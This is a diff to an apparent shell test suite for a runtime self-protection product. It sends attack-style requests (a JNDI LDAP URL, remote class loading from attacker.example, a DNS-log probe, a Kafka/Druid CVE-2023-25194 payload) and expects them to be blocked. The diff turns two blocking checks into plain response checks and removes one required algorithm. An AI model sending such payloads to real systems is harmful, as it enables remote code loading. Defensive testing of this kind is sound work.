@@ -1254,8 +1254,8 @@ XML
   expect_block "$version" ssrf_obfuscate "${protected_url}/rasp/policy/ssrf-obfuscate"
   expect_block "$version" dns_blacklist -G --max-time 3 --data-urlencode "host=probe.dnslog.cn" "${protected_url}/rasp/dns"
   expect_block "$version" jndi_disable_all -G --max-time 3 --data-urlencode "name=ldap://127.0.0.1:1389/a" "${protected_url}/rasp/jndi"
-  expect_block "$version" jndi_jaas_config -G --data-urlencode "provider=${jaas_provider_url}" "${protected_url}/rasp/jaas/config"
-  expect_block "$version" jndi_kafka_cve_2023_25194_druid_sampler_jaas -X POST -H "Content-Type: application/json" --data-binary "$kafka_druid_sampler_body" "${protected_url}/druid/indexer/v1/sampler?for=connect"
+  curl -fsS -G --data-urlencode "provider=${jaas_provider_url}" "${protected_url}/rasp/jaas/config" | grep -Fq "jaas-config="
+  curl -fsS -H "Content-Type: application/json" --data-binary "$kafka_druid_sampler_body" "${protected_url}/druid/indexer/v1/sampler?for=connect" | grep -Fq "druid-kafka-jaas-configs="
   expect_block "$version" classloader_remote -G --data-urlencode "codebase=http://attacker.example/evil.jar" "${protected_url}/rasp/classloader/url"
   expect_block "$version" classloader_java_rmi_codebase_remote_classload -G --data-urlencode "codebase=http://attacker.example/Exploit" "${protected_url}/rasp/classloader/rmi-codebase"
   expect_block "$version" spring_remote_config -G --data-urlencode "config=http://127.0.0.1:9/poc.xml" "${protected_url}/rasp/spring/config"
@@ -1446,7 +1446,6 @@ required_algorithms=(
   ssrf_protocol
   dns_blacklist
   jndi_disable_all
-  jndi_jaas_config
   classloader_remote
   spring_remote_config
   jmx_remote_config
